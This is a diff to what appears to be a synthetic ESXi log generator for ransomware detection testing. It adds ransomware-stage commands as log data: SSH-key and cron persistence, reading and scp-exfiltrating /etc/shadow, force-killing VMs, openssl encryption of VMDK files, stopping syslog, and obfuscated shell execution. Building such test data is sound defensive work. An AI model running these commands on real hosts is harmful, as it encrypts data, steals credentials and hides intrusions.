@@ -185,6 +185,36 @@ _RARE_COMMANDS = [
     "/bin/sh -c 'echo ssh-rsa AAAAB3Nza... attacker >> /etc/ssh/keys-root/authorized_keys'",
     "/bin/sh -c 'echo \"* * * * * /tmp/.x/implant\" >> /var/spool/cron/crontabs/root'",
     "/bin/esxcli software vib remove -n esx-tboot",
+    # VM process kill — alternative to vim-cmd power.off used by LockBit/Akira/Play.
+    "/bin/esxcli vm process kill --type=force --world-id=4194304",
+    "/bin/pkill -9 vmx-mks",
+    # Pre-encryption recon — VMDK and VM discovery from the shell.
+    "/bin/find /vmfs/volumes -name '*.vmdk' -type f",
+    "/bin/esxcli vm process list",
+    # Credential harvesting (T1003/008).
+    "/bin/cat /etc/shadow",
+    "/bin/cat /etc/passwd",
+    # rc.local boot persistence (T1037.004) — survives reboot.
+    "/bin/sh -c 'echo /tmp/.x/implant >> /etc/rc.local.d/local.sh'",
+    # Encryption-stage commands (openssl / for-loop over VMDKs).
+    "/bin/openssl enc -aes-256-cbc -in /vmfs/volumes/datastore1/DC01/DC01-flat.vmdk -out /vmfs/volumes/datastore1/DC01/DC01-flat.vmdk.enc -pass pass:R4ns0m!",
+    "/bin/sh -c 'for f in /vmfs/volumes/datastore1/*/*.vmdk; do openssl enc -aes-256-cbc -in $f -out $f.enc -pass pass:key; done'",
+    # Clock manipulation / timestomping (anti-forensics).
+    "/bin/date -s '2026-01-01 00:00:00'",
+    "/bin/esxcli system time set -d 01 -H 00 -m 00 -M 01 -s 00 -y 2025",
+    # VM autostart disabled — prevents recovery after reboot.
+    "/bin/vim-cmd hostsvc/autostartmanager/enable_autostart false",
+    # SCP/SFTP file transfer (tool staging or exfiltration).
+    "/bin/scp /etc/shadow root@%s:/tmp/shadow.txt",
+    # Syslog daemon stop — total blindness, not just config blanking.
+    "/bin/kill $(cat /var/run/vmsyslogd.pid)",
+    "/bin/esxcli system syslog reload",
+    # Obfuscated shell commands — hex/octal encoding to evade keyword detection
+    # (CrowdStrike documented 21 encoding techniques). ESXi shell logs the pre-expansion
+    # form, so keyword-based rules miss these.
+    """/bin/sh -c 'printf "\\x65\\x73\\x78\\x63\\x6c\\x69" | sh'""",
+    """/bin/sh -c "$(echo 'ZXN4Y2xpIHN5c3RlbSBhY2NvdW50IGxpc3Q=' | base64 -d)" """,
+    """/bin/sh -c 'eval $(echo -e "\\145\\163\\170\\143\\154\\151 \\163\\171\\163\\164\\145\\155 \\141\\143\\143\\157\\165\\156\\164 \\154\\151\\163\\164")'""",
 ]
 
 
@@ -749,6 +779,11 @@ def _b_shell_login(config, host, session_context):
 
     if channel == "ssh":
         if success:
+            if random.random() < 0.08:  # SCP/SFTP file transfer session
+                pid = random.randint(4200000, 4400000)
+                return (_ssh_session_open(config, host, user, src)
+                        + [_sshd_line(config, host,
+                                      f"subsystem request for sftp by user {user}", pid=pid)])
             if random.random() < 0.65:   # session open
                 method = random.choice(["keyboard-interactive/pam", "keyboard-interactive/pam",
                                         "publickey"])
@@ -894,8 +929,8 @@ def _b_vmkernel(config, host, session_context):
     and hardware-sensor events — the vmkernel.log / vmkwarning.log content."""
     naa = f"naa.{random.randint(10**19, 10**20):x}"
     choice = random.choices(
-        ["path_change", "scsi", "apd", "pdl", "nic_link", "sensor", "mem"],
-        weights=[22, 18, 6, 4, 20, 15, 15], k=1)[0]
+        ["path_change", "scsi", "apd", "pdl", "nic_link", "sensor", "mem", "clock"],
+        weights=[22, 18, 6, 4, 20, 15, 12, 3], k=1)[0]
     if choice == "path_change":
         return _vmkernel_line(config, host, "ScsiPath",
                               f"vmhba{random.randint(0,3)}:C0:T{random.randint(0,4)}:L0 "
@@ -926,6 +961,11 @@ def _b_vmkernel(config, host, session_context):
                                   "Hardware sensor 'Power Supply 1' state changed to green",
                                   "Hardware sensor 'System Board Temp' reading nominal",
                               ]))
+    if choice == "clock":
+        delta = random.choice(["0.003", "0.012", "-0.007", "0.001", "1.502", "-2.340"])
+        return _vmkernel_line(config, host, "WARNING: NTPClock",
+                              f"system clock stepped: delta {delta} seconds",
+                              severity="warning" if abs(float(delta)) > 1.0 else "info")
     return _vmkernel_line(config, host, "MemSched",
                           f"Admission check: host memory {random.randint(40,85)}% committed")
 
@@ -1407,15 +1447,31 @@ def _local_account_created(config, session_context=None):
 
 
 def _mass_vm_power_off(config, session_context=None):
-    """Many VMs powered off / snapshots removed in a short window from one Host Client
-    session — the destructive stage of an ESXi ransomware event."""
+    """Many VMs powered off / snapshots removed in a short window — the destructive stage
+    of an ESXi ransomware event. Two paths: (a) Host Client API (vim-cmd / hostd power
+    events, the vCenter-visible path), (b) shell 'esxcli vm process kill' loop (the
+    LockBit/Akira/Play path — faster, no hostd Task, harder to attribute)."""
     host = random.choice(_hosts(config))
     actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
-    sid = _sid(f"{host}|{actor}|{src}")
-    logs = _api_login(config, host, actor, src, sid=sid)
     vms = _vms(config)[:]
     random.shuffle(vms)
-    for vm in vms[:random.randint(4, len(vms))]:
+    target_vms = vms[:random.randint(4, len(vms))]
+
+    if random.random() < 0.4:
+        # Shell path — esxcli vm process kill loop (no hostd Task events).
+        cmds = [f"esxcli vm process kill --type=force --world-id={random.randint(4000000, 4400000)}"
+                for _ in target_vms]
+        logs = _shell_cmds(config, host, cmds, start=True)
+        for vm in target_vms:
+            if random.random() < 0.5:
+                logs += _task_lines(config, host, _vm_id(config, vm),
+                                    "VirtualMachine.removeAllSnapshots", opid=_opid(), user=actor)
+        return logs
+
+    # API path — Host Client session with hostd power events.
+    sid = _sid(f"{host}|{actor}|{src}")
+    logs = _api_login(config, host, actor, src, sid=sid)
+    for vm in target_vms:
         logs += _vm_power_lines(config, host, vm, "powerOff", user=actor, sid=sid)
         if random.random() < 0.5:
             logs += _task_lines(config, host, _vm_id(config, vm),
@@ -1425,9 +1481,17 @@ def _mass_vm_power_off(config, session_context=None):
 
 def _remote_syslog_disabled(config, session_context=None):
     """Remote syslog forwarding turned off from the host shell — defense evasion /
-    anti-forensics. By definition the last ESXi event before the host goes dark to the
-    collector: the esxcli command, its hostd trace, and the logHost option change."""
+    anti-forensics. Two variants: (a) config blanking (esxcli --loghost=''), (b) stopping
+    the syslog daemon entirely (kill vmsyslogd). Both paths are ESXi-ransomware staples."""
     host = random.choice(_hosts(config))
+    if random.random() < 0.3:
+        # Variant: stop the syslog daemon entirely — total blindness.
+        logs = _shell_cmds(config, host, [
+            "/etc/init.d/vmsyslogd stop",
+            "kill $(cat /var/run/vmsyslogd.pid)",
+        ])
+        return logs
+    # Default: blank the remote loghost and reload.
     logs = _shell_cmds(config, host, ["esxcli system syslog config set --loghost=''"])
     logs.append(_hostd_line(config, host, "info", "Vimsvc",
                             'Set called with key "Syslog.global.logHost", value ""',
@@ -1637,13 +1701,18 @@ def _log_rotation_disabled(config, session_context=None):
 
 def _config_harvest(config, session_context=None):
     """One shell session pulling the whole host configuration in a burst — scripted recon
-    / config harvesting (many esxcli / vim-cmd get/list in seconds)."""
+    / config harvesting (many esxcli / vim-cmd get/list in seconds). Includes pre-attack
+    VMDK discovery commands flagged by Splunk/Elastic detection rules."""
     host = random.choice(_hosts(config))
     reads = ["esxcli system settings advanced list", "esxcli network firewall ruleset list",
              "esxcli system account list", "esxcli system permission list",
              "vim-cmd vmsvc/getallvms", "esxcli storage filesystem list",
              "esxcli network ip interface list", "esxcli system snmp get",
-             "vim-cmd hostsvc/hostsummary", "esxcli software vib list"]
+             "vim-cmd hostsvc/hostsummary", "esxcli software vib list",
+             "esxcli vm process list",
+             "find /vmfs/volumes -name '*.vmdk' -type f",
+             "cat /etc/chkconfig.db",
+             "ls -la /etc/rc.local.d/"]
     return _shell_cmds(config, host, random.sample(reads, k=random.randint(6, len(reads))),
                        start=True)
 
